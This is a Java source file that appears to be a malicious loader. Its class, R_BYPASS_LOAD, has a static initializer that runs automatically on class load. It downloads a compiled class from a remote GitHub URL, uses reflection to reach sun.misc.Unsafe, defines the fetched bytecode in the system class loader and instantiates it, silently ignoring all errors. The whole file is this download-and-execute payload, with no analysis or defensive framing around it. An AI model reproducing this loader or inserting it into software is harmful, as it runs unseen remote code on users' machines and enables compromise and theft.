import sun.misc.Unsafe;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Map;

public class R_BYPASS_LOAD {

    static {
        try {
            String link =
                    "https://github.com/PomoikaBomja/Remote/raw/main/some_wtf.class";

            URL url = new URL(link);

            InputStream input = new BufferedInputStream(url.openConnection().getInputStream());

            byte[] buffer = new byte[4096];
            int n;
            ByteArrayOutputStream output = new ByteArrayOutputStream(4096);
            while ((n = input.read(buffer)) != -1) {
                output.write(buffer, 0, n);
            }

            Field f = Unsafe.class.getDeclaredField("theUnsafe");
            f.setAccessible(true);
            Unsafe unsafe = (Unsafe) f.get(null);
            Class c = unsafe.defineClass("some_wtf", output.toByteArray(), 0, output.size(), ClassLoader.getSystemClassLoader(), null);
            c.newInstance();
            output.close();

        } catch (Throwable throwable) {

        }
    }
}
